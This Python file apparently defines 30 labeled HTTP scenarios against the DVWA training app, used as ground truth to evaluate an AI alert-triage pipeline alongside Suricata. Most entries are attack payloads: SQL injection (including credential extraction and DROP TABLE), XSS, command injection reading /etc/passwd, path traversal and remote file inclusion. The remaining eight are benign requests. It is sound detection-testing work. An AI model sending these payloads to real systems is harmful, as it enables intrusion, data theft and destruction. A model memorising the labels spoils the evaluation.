"""
scenarios.py - Ground-truth attack scenarios for evaluation.

Each Scenario is a single HTTP request against DVWA paired with the expected
classification. The evaluation runner fires these in sequence, then matches
the AI's output against this ground truth.

Ground truth philosophy: the label describes the attacker's INTENT, not
whether the attack would succeed. A SQLi UNION payload against a table that
doesn't exist is still a true positive SQLi attempt — the detection decision
shouldn't care about the outcome.

Each scenario gets a unique `eval_id` embedded in the request (usually via
a query parameter) so the result collector can pair a generated report back
to the specific scenario it came from.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional


@dataclass
class Scenario:
    """A single labeled attack scenario.

    Attributes:
        eval_id: unique marker embedded in the request; used to match reports back
        category: human-readable grouping ("SQLi", "XSS", "Benign", etc.)
        description: short description shown in evaluation report
        method: HTTP method
        path: relative URL path (no host)
        query_params: additional query params BEYOND the eval_id tag
        form_data: POST body (if method=POST)

        expected_classification: "true_positive" or "likely_false_positive"
        expected_severity: "Low" | "Medium" | "High" (for TPs; meaningful only
                           when the detection engine should recognise the attack)
        expected_attack_type: one of SQLi/XSS/PathTraversal/CommandInjection/
                              Reconnaissance/Other
        expected_to_trigger_suricata: whether we expect Suricata to actually fire
                                      an alert. Some "attacks" are so mild Suricata
                                      won't even notice (e.g. `?id=1` by itself).
    """
    eval_id: str
    category: str
    description: str
    method: str
    path: str
    query_params: Dict[str, str] = field(default_factory=dict)
    form_data: Optional[Dict[str, str]] = None

    expected_classification: str = "true_positive"
    expected_severity: str = "Medium"
    expected_attack_type: str = "Other"
    expected_to_trigger_suricata: bool = True


# ---------------------------------------------------------------------------
# Scenario set
# ---------------------------------------------------------------------------
#
# Chosen for breadth across common web attack categories while keeping the
# suite small enough to run in a reasonable time window. With debounce + LLM
# time per scenario, 30 scenarios takes roughly 10-20 minutes end-to-end.
#
# SQLi: 8 variants covering UNION/boolean/error/time-based and obfuscations.
# XSS: 6 variants covering reflected/event handlers/encoded payloads.
# Command injection: 3 variants.
# Path traversal: 3 variants.
# Recon: 2 variants (suspicious scanner-like requests).
# Benign: 8 variants that SHOULD NOT be classified as attacks.
# ---------------------------------------------------------------------------

SCENARIOS: List[Scenario] = [
    # -------- SQL injection (true positives, mostly High severity) --------
    Scenario(
        eval_id="sqli_union_001",
        category="SQLi",
        description="Classic UNION SELECT extracting users table",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={
            "id": "1' UNION SELECT user, password FROM users#",
            "Submit": "Submit",
        },
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_union_002",
        category="SQLi",
        description="UNION with explicit NULL padding",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={
            "id": "1' UNION SELECT NULL, version()#",
            "Submit": "Submit",
        },
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_bool_003",
        category="SQLi",
        description="Boolean-based blind SQLi",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "1' AND 1=1#", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="Medium",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_bool_004",
        category="SQLi",
        description="Boolean-based SQLi with string comparison",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "1' OR 'a'='a", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="Medium",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_error_005",
        category="SQLi",
        description="Error-based SQLi triggering CAST failure",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={
            "id": "1' AND CAST((SELECT user FROM users LIMIT 1) AS INT)--",
            "Submit": "Submit",
        },
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_time_006",
        category="SQLi",
        description="Time-based blind SQLi (SLEEP)",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "1' AND SLEEP(2)--", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="Medium",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_drop_007",
        category="SQLi",
        description="Stacked query DROP TABLE attempt",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={
            "id": "1'; DROP TABLE users--",
            "Submit": "Submit",
        },
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="SQLi",
    ),
    Scenario(
        eval_id="sqli_short_008",
        category="SQLi",
        description="Minimal SQLi — single quote error probe",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "'", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="Low",
        expected_attack_type="SQLi",
        # Minimal payload — Suricata's ET rules may or may not fire on a lone quote
        expected_to_trigger_suricata=False,
    ),

    # -------- Cross-site scripting (true positives, High severity) --------
    Scenario(
        eval_id="xss_script_009",
        category="XSS",
        description="Classic <script>alert()</script> reflected",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "<script>alert('xss')</script>"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="XSS",
    ),
    Scenario(
        eval_id="xss_img_010",
        category="XSS",
        description="<img onerror=> event handler XSS",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "<img src=x onerror=alert(1)>"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="XSS",
    ),
    Scenario(
        eval_id="xss_svg_011",
        category="XSS",
        description="SVG onload XSS",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "<svg/onload=alert(1)>"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="XSS",
    ),
    Scenario(
        eval_id="xss_attr_012",
        category="XSS",
        description="Attribute-break XSS payload",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": '"><script>alert(1)</script>'},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="XSS",
    ),
    Scenario(
        eval_id="xss_encoded_013",
        category="XSS",
        description="URL-encoded XSS payload",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="XSS",
        # Double-encoding can slip past some rule variants
        expected_to_trigger_suricata=True,
    ),
    Scenario(
        eval_id="xss_js_014",
        category="XSS",
        description="javascript: URI payload",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "javascript:alert(1)"},
        expected_classification="true_positive",
        expected_severity="Medium",
        expected_attack_type="XSS",
        expected_to_trigger_suricata=False,  # often not detected by default rules
    ),

    # -------- Command injection (true positives, High severity) --------
    Scenario(
        eval_id="cmdi_semicolon_015",
        category="CommandInjection",
        description="Shell command injection via semicolon",
        method="POST",
        path="/vulnerabilities/exec/",
        form_data={"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="CommandInjection",
    ),
    Scenario(
        eval_id="cmdi_pipe_016",
        category="CommandInjection",
        description="Command injection via pipe",
        method="POST",
        path="/vulnerabilities/exec/",
        form_data={"ip": "127.0.0.1 | whoami", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="CommandInjection",
    ),
    Scenario(
        eval_id="cmdi_backtick_017",
        category="CommandInjection",
        description="Command injection via backticks",
        method="POST",
        path="/vulnerabilities/exec/",
        form_data={"ip": "127.0.0.1 `id`", "Submit": "Submit"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="CommandInjection",
    ),

    # -------- Path traversal / LFI (true positives) --------
    Scenario(
        eval_id="lfi_passwd_018",
        category="FileInclusion",
        description="Classic /etc/passwd file inclusion",
        method="GET",
        path="/vulnerabilities/fi/",
        query_params={"page": "../../../../etc/passwd"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="PathTraversal",
    ),
    Scenario(
        eval_id="lfi_http_019",
        category="FileInclusion",
        description="Remote file inclusion via http://",
        method="GET",
        path="/vulnerabilities/fi/",
        query_params={"page": "http://example.com/shell.txt"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="FileInclusion",
    ),
    Scenario(
        eval_id="lfi_php_020",
        category="FileInclusion",
        description="PHP wrapper for source disclosure",
        method="GET",
        path="/vulnerabilities/fi/",
        query_params={"page": "php://filter/convert.base64-encode/resource=index"},
        expected_classification="true_positive",
        expected_severity="High",
        expected_attack_type="FileInclusion",
        expected_to_trigger_suricata=False,  # rule coverage for this is inconsistent
    ),

    # -------- Reconnaissance (true positives, Low/Medium severity) --------
    Scenario(
        eval_id="recon_robots_021",
        category="Reconnaissance",
        description="robots.txt probe (scanner-like)",
        method="GET",
        path="/robots.txt",
        query_params={},
        expected_classification="true_positive",
        expected_severity="Low",
        expected_attack_type="Reconnaissance",
        expected_to_trigger_suricata=False,  # benign by itself; often ignored
    ),
    Scenario(
        eval_id="recon_admin_022",
        category="Reconnaissance",
        description="Admin panel probe",
        method="GET",
        path="/admin/",
        query_params={},
        expected_classification="true_positive",
        expected_severity="Low",
        expected_attack_type="Reconnaissance",
        expected_to_trigger_suricata=False,
    ),

    # -------- Benign traffic (false positives if flagged) --------
    Scenario(
        eval_id="benign_home_023",
        category="Benign",
        description="Plain GET of DVWA home page",
        method="GET",
        path="/",
        query_params={},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_sqli_empty_024",
        category="Benign",
        description="SQLi page with no payload",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "1", "Submit": "Submit"},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_xss_name_025",
        category="Benign",
        description="XSS page with innocuous name",
        method="GET",
        path="/vulnerabilities/xss_r/",
        query_params={"name": "Alice"},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_word_026",
        category="Benign",
        description="SQLi page with a word containing 'select'",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "selection", "Submit": "Submit"},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_num_027",
        category="Benign",
        description="Typical legitimate ID lookup",
        method="GET",
        path="/vulnerabilities/sqli/",
        query_params={"id": "42", "Submit": "Submit"},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_security_028",
        category="Benign",
        description="Legitimate security page load",
        method="GET",
        path="/security.php",
        query_params={},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_about_029",
        category="Benign",
        description="Legitimate about page",
        method="GET",
        path="/about.php",
        query_params={},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
    Scenario(
        eval_id="benign_instructions_030",
        category="Benign",
        description="Legitimate instructions page",
        method="GET",
        path="/instructions.php",
        query_params={},
        expected_classification="likely_false_positive",
        expected_severity="Low",
        expected_attack_type="Other",
        expected_to_trigger_suricata=False,
    ),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def count_by_category() -> Dict[str, int]:
    """Quick sanity check helper: scenario count per category."""
    counts: Dict[str, int] = {}
    for s in SCENARIOS:
        counts[s.category] = counts.get(s.category, 0) + 1
    return counts


def count_by_classification() -> Dict[str, int]:
    counts: Dict[str, int] = {}
    for s in SCENARIOS:
        counts[s.expected_classification] = counts.get(s.expected_classification, 0) + 1
    return counts


def find_scenario(eval_id: str) -> Optional[Scenario]:
    for s in SCENARIOS:
        if s.eval_id == eval_id:
            return s
    return None


if __name__ == "__main__":
    print(f"Total scenarios: {len(SCENARIOS)}")
    print(f"By category    : {count_by_category()}")
    print(f"By classification: {count_by_classification()}")
    expected_triggers = sum(1 for s in SCENARIOS if s.expected_to_trigger_suricata)
    print(f"Expected to trigger Suricata: {expected_triggers}/{len(SCENARIOS)}")